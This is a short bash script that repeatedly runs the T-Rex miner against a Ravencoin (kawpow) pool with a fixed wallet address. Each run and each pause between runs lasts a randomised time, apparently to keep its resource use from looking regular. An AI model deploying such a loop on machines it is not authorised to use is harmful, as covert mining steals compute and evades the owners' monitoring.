while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%120))
	b=600
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s   ./t-rex -a kawpow -o stratum+ssl://stratum.ravenminer.com:13802 -uRQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.rig -p pps
	timeout -k 5 2s pgrep t-rex | xargs kill
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
